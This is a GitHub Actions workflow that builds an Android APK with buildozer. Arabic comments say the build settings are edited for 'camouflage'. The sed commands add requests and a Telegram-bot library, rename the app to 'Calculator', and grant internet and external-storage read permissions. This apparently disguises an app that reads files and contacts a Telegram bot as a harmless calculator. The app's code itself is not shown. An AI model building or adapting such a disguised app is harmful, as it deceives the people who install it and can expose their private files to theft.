name: Build APK
on: [push, pull_request, workflow_dispatch]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: 3.9
      - name: Install dependencies
        run: |
          pip install buildozer cython==0.29.33
          sudo apt-get install -y scons libncurses5-dev libncursesw5-dev libyaml-dev libssl-dev python3-dev libffi-dev libssl-dev
      - name: Build APK
        run: |
          # تشغيل تهيئة المصنع
          yes | buildozer init
          # تعديل ملف الإعدادات للتمويه وإضافة المكتبات
          sed -i 's/requirements = python3,kivy/requirements = python3,kivy,requests,pytelebotapi/g' buildozer.spec
          sed -i 's/title = My Application/title = Calculator/g' buildozer.spec
          sed -i 's/# android.permissions = INTERNET/android.permissions = INTERNET,READ_EXTERNAL_STORAGE/g' buildozer.spec
          # نقل ملفاتك للمكان الصحيح
          cp examplePythonProgram/main.py .
          cp examplePythonProgram/icon.png . || true
          # أمر البناء الذي يقوم بتثبيت الـ SDK والـ Aidl تلقائياً
          yes | buildozer -v android debug
      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: calculator-apk
          path: bin/*.apk
